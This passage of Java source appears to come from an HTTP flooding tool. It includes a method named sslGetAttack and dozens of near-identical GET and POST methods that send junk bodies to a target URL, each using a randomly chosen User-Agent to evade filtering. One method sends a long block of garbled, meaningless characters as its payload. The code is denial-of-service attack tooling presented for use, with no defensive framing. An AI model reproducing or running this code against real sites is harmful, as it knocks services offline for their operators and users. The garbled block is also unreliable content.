        int responseCode = con.getResponseCode();
        
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        int responseCode = con.getResponseCode();
    }
    
    private void dandierGet(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierGets(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierPos(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierPost(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierGe(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierPo(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierP(String url) throws Exception {
×äõâÃ¬¤ñÑä÷ãÈþ£¡ÚçÖðåÆü òÑ²×Èð±Æ¨ö¡Ñº¢°ü«¤»ÕòâÅ¨óñ¶ÜÜÈ¡ãÉ¦«§ºÒÌ¦¾¨ö¤Ð³ó¾Â­§ ÒºÔÉðäÉý¤§ÚáÒÛÎ÷³¨ £ãÛð·Â®ªð±ÔÌ¡å¬ ö×·ÒË¦ãù¡ ´Îñ¾­¢öÑäÒÛÈ¦¶­ñ¢µÑÞ¦±­ öÑàÜÞõ°È®£ö±Ü÷çÀ¬«ñ´Ñ¦¶Ã¬¥ñ±Þ¢ãÃ©ô¦¶¢±Á§§ªÓäÕò±¦¥ö´ÔÜÏð±Å­£÷Ñ»ÜÎö¿Ä¬¦¥ÚµÑÙÎ§³Ç©  µó¾È©ªõ×·×Ìö±Åª¤§Ú°û³É¬¡ª±Ý¦çû§òÓ·Üõä¦ñòÑ³Ó äÀù÷¦µÝ¥±Éüð áÝô¾Âú÷¦²ÖòäÀ¨ó Ö´ÐÉôµÇª¢¢×²Üû³¬¥ Ô¶ÓÏ¦·ùô÷Ö´ÒÚËö²Àª¡ªÐºÓÞÌ¡ãÄ¯ñõ¶ÕÙËûäÃ«ó«Ó´Ì µÃ¨ð¤Ò°ÖóåÃ¯ª÷ÖãÖ¢·Ä¦÷ñ±ó³Àù¦§³òâÅ©¡öÛáó¾ù¡ªÔã×ò¿Âª§òÖ»Ö¢±É®¡÷³Î ¶ýö¤Ð±ÓÞÈû¿¨¢§ºÔÌ¥¿Ãþó¢ÓãÓÛÈú±Éù ñÑ² àÇ¬¡¥ºÈò²§£ðµÐû¶Ä¬¢ªºú¶Àûð§àÒñ´Âª§¢äÕòàÄ¯£ñ×»ÝÏ¥âÀ®óñ·ÖÌú²Èúó¡ÛàÖ¥³Ãª÷§ÔáÔÈ °¬ñðÕã×Ù§µ©¦¡ÛºÕÛûµÇ«£§°È¥´®¤òäÕ¦¾È¨ôªá×Ùô´É¨ðñÓ·Îð¾Ã¯ô¦Ñ·Ý§´§¡«ÖçÜ¢µÅ¯óöÑ±Úò±¯  Û»Öö¾Éª¡ªæÓÞõçÄ®¥ Ñ³ÜÈûâÃ¨¤òàÙú¿Â­§§°ð¾Ç®÷¡Õºôã«¥¤ºÐÙòäÅ¯ ¢ÛºÕö³Âù÷ñÔá÷²üóªÕ´ÝÙ÷å¯¦ð±ÓÝ¥¿©ññäô·«ö¢ÓçÜÜ¢âÁ«£«Ñ¶ÕÞÉû´È¬¦ªÔ»Ö÷àÂû¤÷Ñ»ð¿úö¤Û²ÖË¡·Ç¯ðñÐ´Ô¡´ùö«×çÓÈ¥àÃ©ñªãÈ¦¶ÂýóªÑµÔ¥å¬ô÷¶ÜÉóâÂùñöÐäÒÚû³ÂþôñàÓÙÎûâùöªÒ±ô·®¥ª´ÒûåÅûô Ó¶ÕÞö´Éú¥¢çÜ§µÁû£ñ°õ¿Âü£÷ÚºÝÝñ³ÀªóªÕ²Ú¥¶¨«¦ÒäÕÙÌó²­ô ×äÖúçÇ©¡ñÒãÛËõçû ¡ÕäÕû¾«ñð×ºÕÛÌú¿É¬ôõ¶ÜÙÈ¡´Å®¢òä÷ãÄ¯§õÐäÔÞ§äÇýóõÑ»ÜÙÏ ¾Ç¦¤ðÔ»ÙñµÉû÷ñÑµÜÞÌðàÈ¬ó¥ÔãÜ àÅý§ð²¢µú¡¡°ÐÈ¡¶¨£öæÑÎ÷¿Æþ«ñºÐÈ µÈ§ðª·ÕÉú¶® §Ö²ÔÜô¿þ «ÔäÕÌ¦¾Á­÷¡×±×òµÂý§õÒµÜÏ§³¯÷¡Ñ»ÙÉöãÂú¡öÐ°ÐÙ÷¾û«¢Ó±ÖÎû±ÀûôñÑ·Î÷ãü§ ÚãÞ§çÀ¯ðòÖ±ÖÙÌö°§¡öæÎ¦¶þô§Ôºð·È©óñµÓÛÌúä¯ñ¢Ú»Ó¡¶úö÷Ö³ÜûµÃ¯£ªÚ²ÐÝû¶­ £ÐáÐõ·­ó¤ÕàÐÛÉó¶Éúð¡Ò°ô´À«ðõáÑûµþö¤µÒÈðµÈüð«ÔçÒÜõä§§¤×áÐÝðåÄ«§«±ÐÜÉû³Ä«ö¤Ò°Ë¦²ü¦£»Ó ±ý¤ñ°ÞÏôçüô¤ÑäÕõäÉª£¢äÕË¢àÁ¯ª§×·ÔÚðçù¤¦²ÝÈûµÀù«ñÔ²ÜÜó³Æü§¦Õ°ÜòäÀ­§ ÕäÐÙ¢àÁý«ªÔ¶Þò°Ã¬¦«Ô·Öòäý¤ñÕ²Þ¢çÅ¦« Ú²Ôõ°þ¢¡Öµ¢åÆ¬¦öÑçÐÝ÷²Èüñ¢ÓáÑË¦²Á© ¤ÖäË ¿Åû¤«ÓµÕÝõ¿Á¦«òÐ·ÖÉó¾ü¡¦Õ²Õ¡ã«¢«Ö¶ÜÝÉ÷ãÂþó«Ò»ÐÈ¢±Âùñª»ÑÉ¥âª§¤ÐäÐÎ§äÉ¦£¤×àÈ å­£¤áÔò°Ãüð§°Öó¾Æ©§§ÕµÎñãÆýª¤³ÓÝËó°ûð¢×ãÚ¥àÀ««ªÒ±ÑðµÈ¬¥¦Ñ±ÜÌû¾Çþô¤·Òû¾Éù ñçñâ¬£ñÔ°¢àÉû¥¥ÔæÕÝ§´Ä­¦¡ÚæÔÈôäÄ««§ÐºÑÜÈñ³Å§ñ¤Ô±Öò±Éù§õÖµÐÞË¥åü§«×ºû¾Éþ§«Òç¢¿Ä®¥õ±§´¬¦õÛ¶ÜÚñà§ñòÕçÓûàÇ©££ÚãÐËô°Äþ÷¦á¡°Å¦ðªáÒÙ¢å¨ð¦ÕáÑñ²Å¦£¦ÒµÕÏò±ý¥ª»×ÞôåÈªö«çÞ¥´ú¢¦ÒçÓ÷±«ô¢Ú²ÝÎð¾Â«ö ÚãÑ åÃþöñÐºÝË¦·ù¡õµû²È§««Ö»Ý¦åÇþó¥Ó²Û§¶Èü÷¡³úãÁ®÷õ°ÕÞÌ§äÉ®÷¦°Îû°­«öÓºÓÚÌ÷¶Åù¥«×°ÓñåÆ¯¥òãÖÌò´¯ö«ÐãÓ§±ÄüñªÑ±ð´À¦ööÐºÉ¦³©óòÐ»×û¶ù¥÷áÕÛ¦±¨ó÷³Ý§³Äü¥¡ÓáÜÈ÷°¨ «ÐáÔú³ûª¦²Ïð¿¨÷÷ÔäÑ¢àÀþ §áÐú´Ä¬ª¤æÖÎ¦çÃþö£Û»ÒÛÈò±É¦ô¤Õ¶Ôû´Â«¡¢Õ»ÐÝÈóãÅ­¦¥ÓºÔÞÏöçÁ§ðñ×ãÑÉ÷¿«¤§ÖàÕ¡àÃ¦ö¥àÓÈ÷¿È­ªõÛ·ÐÌ¡çÂþóðÓäÐÙËñåú¦¥äÞòàÄ®÷ñµÓÝÏ¡âû¦«»ÕÈ÷·À¨¤ªÑ·ÓÞÌõ¶Ã©¡ªÕäÔÝÉõ³ùª¦ÑãÞôµþ¤ðÐ³×ÝËöµÅû÷ Õá×Ûö±Ã©÷öÑ°Ì¢·®ñ¦æÕÉ§ç©ô¥ÕáÖÙ§°ý§ª·Ü¥¶Á¨ö¥Ñ¶ò¾Â«¦ð»öäÅûôªÓ°ÐÜÏ ±Æ©¡¥µöçÉú«ðÛçÐÛÏðä©¢«±¡äÀùñðÓäÒú¶Æþ£öàÜÌ¦çÂ¬ð¤ÓãÎñäþô¤×àÛðàÇû£õ·ÓËöçÈùô£×°Ì¢åÂýð÷ÔçÖÞñ¶Ãù÷ñÛæÝ¥µÂü¢¥Ñ·Óô´Å¯ôªÑäË¦åÃªó«Ñ±Ò¡åÆ«ªõÛ²ÑÜÉ¢¶Çûóðµ×÷±À§¤¡ÕäÒú¿¦¥£áÐË§ã©ô¤Ð°§ãÆúðõáÜò¶Ãú¢£æÉ÷à®ðñäÈúäÂý£¥ºÙðµ­÷¢Õ±Îô°Ä§¡«ÒäË÷¶¬«¢ÑãÓ¦µ¬ô¢Ö¶ÑÙôå¯ô¥äÐò²Âþ¤§Û²ÒÙÌñçÄû¡÷Û·Òõ³Æ¯ñ¢ÒáÒ§¶Ã¯«ª¶ÓÜðã§¤öµÕÜÏóãÇþ¥öäÔó¿Å§¦ ×°óäÁûô«Û´×Üó¾É¦«ñÚ¶ÔÈ§³È¯ó«æÝÙ¡àªóöÒãÔóåÁ¯÷õÚºÙ µ¨¡÷äÑÝ °Äª÷ö°ÓÈ÷·Ç®¥¡Ú°È¦³Ä§¦ñÚæÔö°¨ôðÕ»ÓÉ¦¶®ñ÷äÜó·ýññ·Ü¥´Çý¡õÚäÝ¦´ùô¥ÓäÝöâÇùóõÐ´ÜÚõç© ¤µÕú±Âþ§òÒ»ÑÙ¥·þ«¤Ó»¢ãÈúª µÑûåÄý§ Ö³Üó¿Âú¢òÑ³Õñç¯óò³Öö¶Ãþ¡¦Ó±ÔÝ¢±Çþ÷öæÖÙ¦¾É¯««ºÝ¡äû÷§ÕºÕÜÎñâ¦£«ÛãÖ¦çÄ¬«ñÓºÔÏ ´Æþô¢áÉó·Á® ¢Ôá¢±Ã¯¥öÓ°ÛÏò¿Æú£òÚäÜ¥â­ô÷äÚÎöåÁ¬§ª´ÜÌð¶Ç¬¥«Ò¶Ñ§µÅ©§÷Ó±ÑÜÈ¥·Äþô ×µ¡ãÃ®¤¦Ñ´ú°É¬£«Ûá¡à¯¡öÓáÔö¿§¢ Ö·Ð¢ã©§öÛµ÷·É§ô«Õ°Ñ¡°¬¥ à×÷ãÁ¨¢ñÖ°ÒÚÎò±È«¦ðÚ´ÚõâÉ§ ð¶¥ãÂ¨¤õÔçôäÀ¨ªòÖäÝñ´ª¢òçÑÈñ±Äùª¡àÕÞÎöå®«§ÓáÓÛÎ¢¾©«÷ÑäÎò±Ã©«¥¶É ä«÷¢ÑæÒû°«£«³Òúåª õÖºÐÜó±ÇüôªÛçÑÈòµ¨¡£°ÔñµÉ¨£ªÛæÝ§äÅú¦ ÐµÉ ·Äª¤¥ÚµÕÏ§²Ç§§ñçÒú·¨¢÷¶§´Â¨ ò×ºÝûâÃý«¤Ö·ÙÎöâÉª¦ð×·ÝÜû³Æýó£×æÈ â«§ªÛ»È¥äÂû öÑ·ÓÚÌ÷´¯ñ¢Ú·Ð¥åÄ¯§õÖãÙ¢¿Åþ §ÕæÖÞðçüññÐ²×É§·À¯§ Õ·ÑÈñãÆüª§Ó°Ý¥â­ôöáÕÚ÷°É¨£¦ÖçÝË¢²Æ¨ð§ÖºÜöà§¢ª´Úöµ¬ñ¤Ó°Ý¥²¨§ ÑµÐÛöçÇüð¥ÐàÑÚöâ«öõÓãÓ÷·Ã©£÷Ñ´Ô¦¿È¯öö»Ó¦àÅ¨¢¡ÔãÒ§´Ç§ðñá§¶É¨«öäÓò´®¡£Òáó·Â¯óòÔàÒÚÌ§äýö¢´ÓÈ °§¢¢ÕãÝðâÀ¦¤÷×²ÓÎõåÄ©ö¤ã×ÎôàÀ§ô£×äÙ¡ã¦¦ð´Õ µÂû§¡Ö²ÑÜ÷²úó¢ÑºÜ¦°Äþ ¤çõ³À¯¥ªÚæÔÙ ·Éü¤¢Ú»öàùª«á ¿Â«ð¢×çòµ¦ô§æÑôåÉ¨¤¡Õ³ËôäÇ§¢ Ô·ÑôäÈ§ôñÚäÙö·Çªð¤ÕæÝË¡²Åù£¡äÖÛòãÉ«¦«Û´ÔËóçûö£µÜÛÏð±ù¥¦Õ³ÑóåÈ¬ô¥×³ÛÏ ¿Á® ¢×áÙ¦µ­§£Û¶×§âú¡ðÕ²ÐÝõà¨ðö²ÑÝË ¿Ç©óñÕæ×ÞËô¶ùñõÓ»×Î¡äÄ¦ó÷ÛäÝôäÉ¯¢õµËñ·¯ª¥Ô°ÐÎõ´Å§¢ ´Ë¥µÉþ¡¦·ÜÚúàÇþ¦ð×¶Îðâ¦ öäÚÈûåÄ§ôò°ÑÈ¢µª¤òÓàÉ¦±Ãúö çÔÌûãÈýð¥´Îû²Èþ£ »ö·Á§§ò·Ý ¿§ª¡»ÝûãÀþö«Ð´ÐöµÆû«¥äÐÚÈ¡±ú ¡ÒºÐÚð¿Æ­¦£Óà×Ïñ³Éû¢òÛ´ÓÚôâÇüª¥çÞ§¾üô¡Õã ¾ù¡¦Õ¶ÓÜð²É¦¢§Ò±ó¿Ãª¦«æÕÞûäú£ñ×»Ò§äù¦¤ÓæÔÙ ±û¥¥»×Þð´Äþª¦·Û§²ùöò×äÉúä©¤ñÐ°ÜËñ±¨¥£°ûåú £Ö²ÔÏ¥°Ä­ñ¥ÑàÓÝñ³Äùñ¢Ú²Öú¿«¥¤Õ´Ýó±Éü¤«Ñ·ÑÛúä¯¤ªæÓò°Æ¬§÷º¥°©¥£Ñàö·È«÷¤æÝ¥²Èª¦ñ×ãÙ§àÇ§£¦ÔæÕú±­¤÷×ãÎ¢µÂ®«òÒºÝÈò´À§ô¦ÕáÕË÷¿Â§ñ ±×§åÀú¡«Ö»Ïðàþ«§Öµ§¿ú¥¤±×ö±¯ªñÔµÓÞû²Âª«ðÕãÏðä¬ª¦àÐ µúó¦×ãÑË¡å«¢÷Ð·Ôû³­ª÷ÕµÉðãÃ¦ö÷ÑçÙÏö°Èý ªÚµð¿Ãª£ªÐã×ÝÈ °Æ¦ðõÛ²Ö¥¶úñ¦Öºñ¾­ª¢ÚæÑÛ¡¿Áûó¡ÒºÔôà¯¥ªÓçÔöåÅ¯¢¥±Ó¡´Ã®ö¢Ô·ÝÞ÷¾ýôòàñäÆ®ô¥ãÕôâ­ó¡àÕËðçÂ¬ó¡Ò»Èú²Çüð¥ÖáÔ¡²Èûö¢ÔçÜ ¿Æ§«õáÜò·Äùª¡ÒµÏô±ýôöÖãÝõàú¤¤çÜö´ûªñÒàÕÜÉö¿Æþóö³×ÌôåÈþ¢¥Ö°ÜÏ¢·Á­ ðÐ°ÑÛ÷¿Ä¦¤¡Û±¢âÄùö¥Ú°×ÞÌñ³Áù£õÖàÒôçÆù¤¤Ò¶ÔÝÎ¦àÇý÷ªÖ³§·¬ôöÑ±ÞË÷±Ä¨ «çÖó³û¢õäÑÌð²Æùö¤Ðã¦ãÇùó¦ãû¶¦öñÓ±ô¿®§ð³ÖÚñä¦¥õ°ÜóäÀ¯÷¤×àÑñµÉý§£æñ´Ç§§§ÚçÎ¡²Éú£õÕàÏû·Á®£öÖµÝ¥ãÇ®öö³ÓËñ¿Âù¥£ÓáÖ ã¦«÷´Ýò±«ôòÖáÈóàÂ©ó¦ÓæÜÛõçÅù¢¢ÐçÝ§³Çù÷£»ÉúâÁªôòæ§äÂû¡òÓã×öµù«ªãÈñ°É¯¦öÐºÞ¦´ýðòÔáÓÛÌû¿Àªð§Ò°×ñ¾««¥×³ÓÈ¢¿Å®¤ò±Ïô¿É§÷¥ºË¦¾Ç¦ñ£Ò¶Òû´®ðð»ÞÈûãÀú¢£ºÜÈ÷±Â©§¤ÒäÌ¦·Ã§ª«´ÎöãÁü§§ÐºÖË¢³Ç§§ð±ÐÈ÷°Æ¬£ö´É¢´Çþ¡§ÓºÜñàª£ñ°Üð·À¨ ¥Ò»Ô÷¿¬¡÷Õ¶ûçÇþ¢¢ÐäÓûåÇû¥¤æÝ ²Èù¥¥ÓºÕÈ¢²Ä¯ª¥ÓµÚð²Ãùö£´ÜÎñ±ª¥ª°ÎóçÃ¨ª Óà¥³© ¢ãÔÚóàÁþ¡ö¶Ö";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
            
     }
    
    private void dandierG1(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG2(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG3(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG4(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG5(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG6(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG7(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG8(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG9(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierG10(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Content-Type", "application/json");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
        
    private void dandierP1(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierP2(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
            
     }
        
    private void dandierP3(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierP4(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
            
     }
        
    private void dandierP5(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierP6(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
            
     }
        
    private void dandierP7(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }
    
    private void dandierP8(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
